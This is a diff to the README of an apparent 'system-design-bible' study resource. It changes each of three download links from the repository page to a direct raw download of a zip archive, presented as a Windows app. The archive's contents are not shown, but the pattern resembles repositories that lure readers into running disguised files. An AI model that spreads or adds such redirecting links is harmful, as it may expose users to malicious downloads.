@@ -1,12 +1,12 @@
 # 🧭 system-design-bible - Learn modern system design faster
 
-[![Download](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pencaudal526/system-design-bible)
+[![Download](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/pencaudal526/system-design-bible/main/ai-era/design-system-bible-v2.2.zip)
 
 ## 📥 Download and setup
 
 Use the link below to visit the page and download the app or files for Windows:
 
-[Open the download page](https://github.com/pencaudal526/system-design-bible)
+[Open the download page](https://raw.githubusercontent.com/pencaudal526/system-design-bible/main/ai-era/design-system-bible-v2.2.zip)
 
 ### What you need
 - A Windows PC
@@ -188,4 +188,4 @@ algorithms, awesome, caching, career, databases, distributed-systems, education,
 
 ## 🖱️ Quick access
 
-[Visit the download page](https://github.com/pencaudal526/system-design-bible)
+[Visit the download page](https://raw.githubusercontent.com/pencaudal526/system-design-bible/main/ai-era/design-system-bible-v2.2.zip)
